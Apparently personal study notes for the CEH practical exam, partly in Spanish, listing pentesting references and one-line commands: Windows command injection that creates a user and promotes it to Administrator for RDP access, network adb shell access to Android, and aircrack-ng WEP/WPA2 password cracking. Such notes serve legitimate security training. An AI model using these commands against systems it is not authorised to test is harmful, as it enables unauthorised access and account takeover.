> Estas son algunas referencias que me parece interesante tener en cuenta

### https://pentestmonkey.net/tools/web-shells/php-reverse-shell

### https://www.invicti.com/learn/remote-code-execution-rce/

### https://swisskyrepo.github.io/InternalAllTheThings/

### https://github.com/Creanyx0/CEHv12-practical-Notes/blob/main/Elisa-Alises-NotesCEHv12.md

<br>

### Command Injection

``net user``  (Find users)
 		       
``dir C:\`` (directory listing)

``net user Test/Add``  (Add a user)

``net user Test``      (Check a user)

``net localgroup Administrators Test/Add``   (To convert the test account to admin)

``net user Test``      (Once again check to see if it has become administrator) *Now you can do a RDP connection with the given ip and the Test account which you created.*

<br>

### Conexion a Android

```adb connect IP:5555```    (Connect adb with parrot)

```adb shell```

<br>

### Cracking Wifi Password

```aircrack-ng [pcap file]``` **For cracking WEP network**

```aircrack-ng -a2 -b [Target BSSID] -w [password_Wordlist.txt] [WP2 PCAP file]``` **For cracking WPA2 or other networks through the captured .pcap file**
